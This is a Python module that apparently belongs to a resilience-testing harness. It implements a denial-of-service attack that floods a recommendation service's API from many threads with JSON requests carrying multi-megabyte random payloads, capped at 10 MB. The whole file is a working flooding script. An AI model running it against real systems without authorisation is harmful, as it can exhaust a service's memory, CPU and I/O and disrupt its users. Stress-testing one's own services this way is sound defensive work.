#!/usr/bin/env python3
import threading
import time
import logging
import random
import string
import requests


class Attack:
    """Oversized payload denial of service targeting the recommendation service."""

    VECTOR_NAME = "oversized_payload_dos"
    TARGET_SERVICE = "recommendation"
    RESOURCE_DIMENSIONS = ("memory", "cpu", "io")

    def __init__(self, configuration, design_path, output_path, test_identifier):
        self.configuration = configuration
        self.output_path = output_path
        self.test_identifier = test_identifier
        self.base_url = (configuration.get("locust_host_url") or "").rstrip("/")
        self.review_path = (
            configuration.get("attack_recommendation_path")
            or configuration.get("attack_review_path")
            or "/api/v1/recommendation"
        )
        self.concurrency = int(float(configuration.get("attack_concurrency", 10)))
        self.timeout = float(configuration.get("attack_request_timeout_seconds", 10))
        size = int(float(configuration.get("attack_large_body_size_bytes", 2 * 1024 * 1024)))
        safe_size = min(size, 10_000_000)
        if safe_size <= 0:
            safe_size = 1024
        # Pre-build a large ASCII payload to avoid regeneration on each request
        alphabet = string.ascii_letters + string.digits
        self.large_blob = "".join(random.choices(alphabet, k=safe_size))
        self.context_tags = ["similar_users", "popular_now", "geo_proximity", "personalized", "seasonal"]

    def worker(self, end_ts, stop_event):
        session = requests.Session()
        url = f"{self.base_url}{self.review_path}"
        headers = {"Content-Type": "application/json"}
        while (time.time() < end_ts) and (not stop_event.is_set()):
            try:
                payload = {
                    "requestId": f"adv-{random.randint(1, 1_000_000)}",
                    "userId": f"noisy-user-{random.randint(1, 10_000)}",
                    "context": {
                        "tags": random.sample(self.context_tags, k=min(3, len(self.context_tags))),
                        "seed": random.randint(1, 1_000),
                    },
                    "candidateIds": [f"item-{random.randint(1, 5000)}" for _ in range(25)],
                    "oversizedPayload": self.large_blob,
                }
                session.post(url, json=payload, headers=headers, timeout=self.timeout)
            except Exception:
                pass

    def run(self, duration_seconds, stop_event):
        logging.info(
            "large_review_post: starting (target_service=%s, concurrency=%d, payload_bytes=%d)",
            self.TARGET_SERVICE,
            self.concurrency,
            len(self.large_blob),
        )
        end_ts = time.time() + duration_seconds
        threads = [threading.Thread(target=self.worker, args=(end_ts, stop_event), daemon=True) for _ in range(self.concurrency)]
        for t in threads:
            t.start()
        for t in threads:
            remaining = max(0.0, end_ts - time.time())
            t.join(timeout=remaining)
        logging.info("large_review_post: finished")
